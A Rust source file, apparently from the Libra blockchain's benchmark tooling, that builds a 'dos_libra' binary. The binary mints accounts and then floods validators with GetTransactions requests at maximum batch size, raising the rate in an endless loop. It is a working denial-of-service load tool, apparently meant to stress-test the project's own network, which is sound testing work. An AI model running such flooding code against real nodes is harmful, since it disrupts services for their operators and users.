use benchmark::{
    bin_utils::{create_benchmarker_from_opt, gen_and_mint_accounts, try_start_metrics_server},
    load_generator::{gen_get_txns_request, LoadGenerator, RingTransferTxnGenerator},
    ruben_opt::RubenOpt,
    Benchmarker,
};
use client::AccountData;
use logger::{self, prelude::*};
use std::time;
use structopt::StructOpt;

#[derive(Debug, StructOpt)]
#[structopt(
    name = "dos_libra",
    author = "Libra",
    about = "Denial of Service Attack on Libra"
)]
pub struct DosOpt {
    #[structopt(flatten)]
    pub ruben_opt: RubenOpt,
    /// Starting submission rate for each client.
    #[structopt(short = "l", long = "lower_bound", default_value = "10")]
    pub lower_bound: u64,
    /// Upper bound value of submission rate for each client.
    #[structopt(short = "u", long = "upper_bound", default_value = "1000")]
    pub upper_bound: u64,
    /// Increase step of submission rate for each client.
    #[structopt(short = "i", long = "inc_step", default_value = "10")]
    pub inc_step: u64,
    /// Increase step of submission rate for each client.
    #[structopt(short = "p", long = "sleep_interval_ms", default_value = "10")]
    pub sleep_interval_ms: u64,
}

impl DosOpt {
    pub fn new_from_args() -> Self {
        let mut args = DosOpt::from_args();
        args.ruben_opt.try_parse_validator_addresses();
        if args.ruben_opt.num_clients == 0 {
            args.ruben_opt.num_clients = args.ruben_opt.validator_addresses.len();
        }
        assert!(args.lower_bound > 0);
        assert!(args.inc_step > 0);
        args
    }
}

pub fn dos_libra<T: LoadGenerator + ?Sized>(
    bm: &mut Benchmarker,
    txn_generator: &mut T,
    faucet_account: &mut AccountData,
    args: &DosOpt,
) {
    let mut rate = args.lower_bound;
    let mut accounts = vec![];
    let mut req_throughput;
    info!("Generating and minting accounts, patience...");
    for _ in 0..args.ruben_opt.num_rounds {
        let new_accounts = gen_and_mint_accounts(bm, txn_generator, faucet_account, args.ruben_opt.num_accounts);
        accounts.extend(new_accounts.into_iter());
    }
    info!(
        "Successfully generate and mint {} accounts.",
        accounts.len(),
    );
    // In storage/libradb/src/lib.rs: const MAX_LIMIT: u64 = 1000;
    let get_txn_req = gen_get_txns_request(0 /* start_version */, 1000 /* limit */);
    let mut num_reqs: usize = 10;
    loop {
        info!(
            "Sending at constant rate {} TPS and {} requests per client.",
            rate, num_reqs,
        );
        let get_txns_reqs = vec![get_txn_req.clone(); num_reqs];
        let (_, request_duration_ms) = bm.submit_requests(&get_txns_reqs, rate);
        req_throughput = num_reqs as f64 * 1000f64 / request_duration_ms as f64;
        let expected_throughput = (rate as f64) * (bm.num_ac_clients() as f64);
        info!(
            "Request throughput at rate {} = {:.4} / {}",
            rate, req_throughput, expected_throughput
        );
        if rate < args.upper_bound {
            std::thread::sleep(time::Duration::from_millis(args.sleep_interval_ms));
            // Increase both number of requests and request speed proportionally.
            num_reqs += (((args.inc_step * num_reqs as u64) as f64) / (rate as f64)) as usize;
            rate += args.inc_step;
        } else {
            // Reset rate when it exceeds upper bound to prevent high resource consumption.
            std::thread::sleep(time::Duration::from_millis(args.sleep_interval_ms * 10));
            rate = args.lower_bound;
            num_reqs = 10;
        }
    }
}

fn main() {
    let _g = logger::set_default_global_logger(false, Some(256));
    info!("DoS Attack on Libra with GetTransactions requests");
    let args = DosOpt::new_from_args();
    info!("Parsed arguments: {:#?}", args);
    try_start_metrics_server(&args.ruben_opt);
    let mut bm = create_benchmarker_from_opt(&args.ruben_opt);
    let mut faucet_account = bm.load_faucet_account(&args.ruben_opt.faucet_key_file_path);
    let mut generator = RingTransferTxnGenerator::new();
    dos_libra(
        &mut bm,
        &mut generator,
        &mut faucet_account,
        &args,
    );
}
